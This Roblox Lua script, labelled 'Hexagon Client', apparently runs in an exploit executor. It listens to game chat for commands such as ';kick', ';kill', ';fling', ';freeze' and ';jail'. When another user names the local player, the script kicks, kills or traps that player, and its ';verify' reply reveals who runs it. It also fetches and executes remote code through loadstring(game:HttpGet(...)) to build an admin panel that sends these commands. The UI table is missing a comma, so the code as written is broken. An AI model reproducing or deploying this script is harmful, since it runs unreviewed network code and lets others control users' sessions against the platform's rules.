local Players = game:GetService("Players")
local TweenService = game:GetService("TweenService")
local TextChatService = game:GetService("TextChatService")
local RunService = game:GetService("RunService")
local LocalPlayer = Players.LocalPlayer

local playerOldSpeed = {}
local jails = {}
local jailConnections = {}

local function sendCommand(command, aim)
    local ch = TextChatService.TextChannels:FindFirstChild("RBXGeneral") or TextChatService.TextChannels:GetChildren()[1]
    if ch then
        ch:SendAsync(";" .. command .. " " .. (aim or ""))
    end
end

local function processMessage(msgText, authorName)
    if not msgText or not authorName then return end

    local commandLower = msgText:lower()
    local targetLower = LocalPlayer.Name:lower()
    local character = LocalPlayer.Character
    local humanoid = character and character:FindFirstChildOfClass("Humanoid")

    if commandLower:match(";kick%s+" .. targetLower) then
        LocalPlayer:Kick("You have been kicked by Hexagon Client")
    end

    if commandLower:match(";kill%s+" .. targetLower) then
        if character then character:BreakJoints() end
    end

    if commandLower:match(";killplus%s+" .. targetLower) then
        if character then
            character:BreakJoints()
            local root = character:FindFirstChild("HumanoidRootPart")
            if root then
                for i=1,5 do
                    local pt = Instance.new("Part", Workspace)
                    pt.Size = Vector3.new(6,6,6)
                    pt.Anchored = false
                    pt.CanCollide = false
                    pt.Material = Enum.Material.Neon
                    pt.BrickColor = BrickColor.Random()
                    pt.CFrame = root.CFrame
                    local bv = Instance.new("BodyVelocity", pt)
                    bv.Velocity = Vector3.new(math.random(-50,50), math.random(20,80), math.random(-50,50))
                    bv.MaxForce = Vector3.new(1e5,1e5,1e5)
                    game.Debris:AddItem(pt,3)
                end
            end
        end
    end

    if commandLower:match(";fling%s+" .. targetLower) then
        if character then
            local root = character:FindFirstChild("HumanoidRootPart")
            if root then
                TweenService:Create(root, TweenInfo.new(1, Enum.EasingStyle.Linear), {CFrame = CFrame.new(0,100000,0)}):Play()
            end
        end
    end

    if commandLower:match(";freeze%s+" .. targetLower) then
        if humanoid then
            playerOldSpeed[targetLower] = humanoid.WalkSpeed
            humanoid.WalkSpeed = 0
        end
    end

    if commandLower:match(";unfreeze%s+" .. targetLower) then
        if humanoid then
            humanoid.WalkSpeed = playerOldSpeed[targetLower] or 16
        end
    end

    if commandLower:match(";jail%s+" .. targetLower) then
        if character then
            local root = character:FindFirstChild("HumanoidRootPart")
            if root then
                local pos = root.Position
                jails[targetLower] = {}

                local function jailPart(cf,s)
                    local p = Instance.new("Part", Workspace)
                    p.Anchored = true
                    p.Size = s
                    p.CFrame = cf
                    p.Transparency = 0.5
                    p.Color = Color3.fromRGB(0,0,0)
                    table.insert(jails[targetLower], p)
                end

                jailPart(CFrame.new(pos + Vector3.new(5,0,0)), Vector3.new(1,10,10))
                jailPart(CFrame.new(pos + Vector3.new(-5,0,0)), Vector3.new(1,10,10))
                jailPart(CFrame.new(pos + Vector3.new(0,0,5)), Vector3.new(10,10,1))
                jailPart(CFrame.new(pos + Vector3.new(0,0,-5)), Vector3.new(10,10,1))
                jailPart(CFrame.new(pos + Vector3.new(0,5,0)), Vector3.new(10,1,10))
                jailPart(CFrame.new(pos + Vector3.new(0,-5,0)), Vector3.new(10,1,10))

                jailConnections[targetLower] = RunService.Heartbeat:Connect(function()
                    if character and root then
                        if (root.Position - pos).Magnitude > 5 then
                            root.CFrame = CFrame.new(pos)
                        end
                    end
                end)
            end
        end
    end

    if commandLower:match(";unjail%s+" .. targetLower) then
        if jails[targetLower] then
            for _, v in pairs(jails[targetLower]) do
                if v and v.Destroy then pcall(v.Destroy, v) end
            end
            jails[targetLower] = nil
        end
        if jailConnections[targetLower] then
            jailConnections[targetLower]:Disconnect()
            jailConnections[targetLower] = nil
        end
    end

    if commandLower:match("^;verify") then
        local ch = TextChatService.TextChannels:FindFirstChild("RBXGeneral") or TextChatService.TextChannels:GetChildren()[1]
        if ch then ch:SendAsync("Hexagon_####") end
    end
end

local function conectChannel(ch)
    if not ch or not ch.IsA then return end
    if not ch:IsA("TextChannel") then return end
    ch.MessageReceived:Connect(function(msg)
        local text = msg.Text
        local source = msg.TextSource and msg.TextSource.Name
        if text and source then
            processMessage(text, source)
        end
    end)
end

for _, tch in pairs(TextChatService.TextChannels:GetChildren()) do
    conectChannel(tch)
end
TextChatService.TextChannels.ChildAdded:Connect(function(tch)
    conectChannel(tch)
end)

local WindUILib = loadstring(game:HttpGet("https://github.com/Footagesus/WindUI/releases/latest/download/main.lua"))()
local Window = WindUILib:CreateWindow({
    Title = "Hexagon Client",
	Icon = "rbxassetid://130681274976406",
    Author = "Admin"
    Size = UDim2.fromOffset(580,460),
    Transparent = true,
    Theme = "Dark",
})

local AdmTab = Window:Tab({ Title = "Admin", Icon = "crown" })
local Section = AdmTab:Section({ Title = "Admin Commands", Icon = "user-cog" })

local function getPlayersList()
local t = {}
for _, p in ipairs(Players:GetPlayers()) do
    table.insert(t, p.Name)
end
return t
end

local TargetName
local Dropdown = Section:Dropdown({
    Title = "Select Player",
    Values = getPlayersList(),
    Value = "",
    Callback = function(opt) TargetName = opt end
})

Players.PlayerAdded:Connect(function()
	Dropdown:SetValues(getPlayersList())
end)
Players.PlayerRemoving:Connect(function()
	Dropdown:SetValues(getPlayersList())
end)

local commands = {"verify","kick","kill","killplus","fling","freeze","unfreeze","jail","unjail"}
for _, cmd in ipairs(commands) do
Section:Button({
    Title = cmd:lower(),
    Desc = "Use ;"..cmd.." - Target",
    Callback = function()
        if cmd == "verify" then
			sendCommand("verify", "")
    	else
		if TargetName and TargetName ~= "" then
			sendCommand(cmd, TargetName)
		else
		warn("No player selected")
        end
    end
end
})
end
